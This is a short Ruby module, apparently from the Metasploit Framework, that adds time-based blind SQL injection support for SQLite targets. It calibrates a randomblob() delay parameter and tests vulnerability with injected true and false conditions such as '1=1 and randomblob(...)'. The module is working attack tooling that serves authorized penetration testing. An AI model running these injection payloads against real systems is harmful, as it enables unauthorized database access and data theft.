require 'msf/core/exploit/sqli/utils/time_based_blind'

#
#   Time-Based Blind SQL injection support for SQLite
#
class Msf::Exploit::SQLi::SQLitei::TimeBasedBlind < Msf::Exploit::SQLi::SQLitei::Common
  include ::Msf::Exploit::SQLi::TimeBasedBlindMixin

  HEAVYQUERY_DETECTION_SAMPLE = 10 # number of times to check if the block takes a delay of @sleepdelay

  def initialize(datastore, framework, user_output, opts = {}, &query_proc)
    @sleepdelay = datastore['SqliDelay'] || 1
    super
    if opts[:heavyquery_parameter]
      @heavyquery_parameter = opts[:heavyquery_parameter]
    else
      detect_heavyquery_parameter
    end
    vprint_status "randomblob parameter: #{@heavyquery_parameter}"
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #  @return [Boolean] whether the target is detected as vulnerable or not
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("1=1 and randomblob(#{@heavyquery_parameter})")
    out_false = blind_request("1=2 and randomblob(#{@heavyquery_parameter})")
    out_true && !out_false
  end

  private

  def detect_heavyquery_parameter
    @heavyquery_parameter = 10000000
    loop do
      break if HEAVYQUERY_DETECTION_SAMPLE.times.all? { blind_request("randomblob(#{@heavyquery_parameter})") }

      @heavyquery_parameter *= 2
    end
    @heavyquery_parameter = @heavyquery_parameter * 3 / 2 # for safety
  end
end
